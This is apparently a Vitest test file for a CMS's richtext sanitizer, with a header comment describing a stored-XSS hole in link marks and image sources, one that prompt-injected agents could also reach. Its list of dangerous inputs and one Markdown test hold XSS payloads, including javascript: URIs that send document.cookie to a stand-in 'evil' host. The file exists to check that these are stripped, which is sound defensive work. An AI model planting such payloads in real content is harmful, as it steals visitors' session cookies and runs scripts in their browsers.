import { describe, expect, it } from "vitest";
import { type FieldDef, coerceFieldValue, dataSchemaFor, type ContentTypeDef } from "@paperboy/shared";

/**
 * Richtext link marks and image srcs must be scheme-checked AT THE WRITE CHOKEPOINT.
 *
 * The structured `link` field already rejects `javascript:`/`data:` via SAFE_HREF, on
 * the stated rule "rejected at the WRITE chokepoint, not patched at render". Richtext
 * was exempt: the sanitizer filtered marks by TYPE only and never looked at
 * `attrs.href`, and an image node was kept if `src` was any non-empty string.
 *
 * So a `javascript:` link survived the write and was served verbatim by the PUBLIC
 * Delivery API. The only defence was `rtSafeHref` inside @paperboycms/client — one
 * consumer. Every customer who renders the TipTap JSON themselves (Astro `set:html`,
 * Vue, `generateHTML` — all documented integration paths) shipped live stored XSS,
 * reachable by the lowest content role and by any prompt-injected agent.
 *
 * Note the Markdown path is an equally good carrier: `[x](javascript:…)` is converted
 * to a link mark by the same chokepoint, so `set_field`, AI-generated copy and
 * translation all reach it.
 */
const richtext: FieldDef = {
  name: "body",
  displayName: "Body",
  type: "richtext",
  localized: false,
  required: false,
  delivery: "public",
  allowedBlocks: [],
  allowedTypes: [],
  options: [],
  multiple: false,
  group: "Content",
};

const TYPE: ContentTypeDef = { name: "T", displayName: "T", kind: "page", fields: [richtext] };

const doc = (content: unknown[]) => ({ type: "doc", content });
const linked = (text: string, href: string) => ({
  type: "paragraph",
  content: [{ type: "text", text, marks: [{ type: "link", attrs: { href } }] }],
});

/** Every link mark surviving the chokepoint, at any depth. */
function linkHrefs(value: unknown): string[] {
  const out: string[] = [];
  const walk = (n: unknown): void => {
    if (Array.isArray(n)) return n.forEach(walk);
    if (!n || typeof n !== "object") return;
    const node = n as { marks?: { type?: string; attrs?: { href?: unknown } }[]; content?: unknown };
    for (const m of node.marks ?? []) {
      if (m?.type === "link" && typeof m.attrs?.href === "string") out.push(m.attrs.href);
    }
    walk(node.content);
  };
  walk(value);
  return out;
}

/** Every image src surviving the chokepoint. */
function imageSrcs(value: unknown): string[] {
  const out: string[] = [];
  const walk = (n: unknown): void => {
    if (Array.isArray(n)) return n.forEach(walk);
    if (!n || typeof n !== "object") return;
    const node = n as { type?: string; attrs?: { src?: unknown }; content?: unknown };
    if (node.type === "image" && typeof node.attrs?.src === "string") out.push(node.attrs.src);
    walk(node.content);
  };
  walk(value);
  return out;
}

const DANGEROUS = [
  "javascript:alert(1)",
  "JavaScript:alert(1)",
  "  javascript:fetch('//evil/'+document.cookie)",
  "jAvAsCrIpT:alert(1)",
  "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
  "vbscript:msgbox(1)",
];

describe("richtext link marks are scheme-checked at the write chokepoint", () => {
  it("drops a dangerous link mark but KEEPS the text", () => {
    for (const href of DANGEROUS) {
      const out = coerceFieldValue(richtext, doc([linked("click me", href)]));
      expect(linkHrefs(out), `${href} survived`).toEqual([]);
      expect(JSON.stringify(out), "the visible text must not be destroyed").toContain("click me");
    }
  });

  it("keeps legitimate link schemes", () => {
    for (const href of ["https://example.com/a?b=1#c", "http://example.com", "mailto:a@b.c", "tel:+4712345678", "/relative", "#anchor"]) {
      const out = coerceFieldValue(richtext, doc([linked("ok", href)]));
      expect(linkHrefs(out), `${href} was wrongly dropped`).toEqual([href]);
    }
  });

  it("closes the MARKDOWN carrier too (set_field, AI copy, translation)", () => {
    const out = coerceFieldValue(richtext, '[click me](javascript:fetch("//evil/"+document.cookie))');
    expect(linkHrefs(out)).toEqual([]);
    expect(JSON.stringify(out)).toContain("click me");
  });

  it("markdown keeps a safe link", () => {
    const out = coerceFieldValue(richtext, "[docs](https://example.com/docs)");
    expect(linkHrefs(out)).toEqual(["https://example.com/docs"]);
  });

  it("drops an image node whose src is a script/data URI", () => {
    for (const src of DANGEROUS) {
      const out = coerceFieldValue(richtext, doc([{ type: "image", attrs: { src } }]));
      expect(imageSrcs(out), `${src} survived`).toEqual([]);
    }
  });

  it("keeps a normal image src", () => {
    const src = "/api/v1/media/abc123.png";
    const out = coerceFieldValue(richtext, doc([{ type: "image", attrs: { src } }]));
    expect(imageSrcs(out)).toEqual([src]);
  });

  it("strips at DEPTH, not just the top level", () => {
    const nested = doc([
      { type: "blockquote", content: [{ type: "bulletList", content: [{ type: "listItem", content: [linked("deep", "javascript:alert(1)")] }] }] },
    ]);
    expect(linkHrefs(coerceFieldValue(richtext, nested))).toEqual([]);
  });

  it("the sanitized value still validates as a richtext doc (both strict and draft)", () => {
    const out = coerceFieldValue(richtext, doc([linked("click me", "javascript:alert(1)")]));
    expect(dataSchemaFor(TYPE, true).safeParse({ body: out }).success).toBe(true);
    expect(dataSchemaFor(TYPE, false).safeParse({ body: out }).success).toBe(true);
  });
});
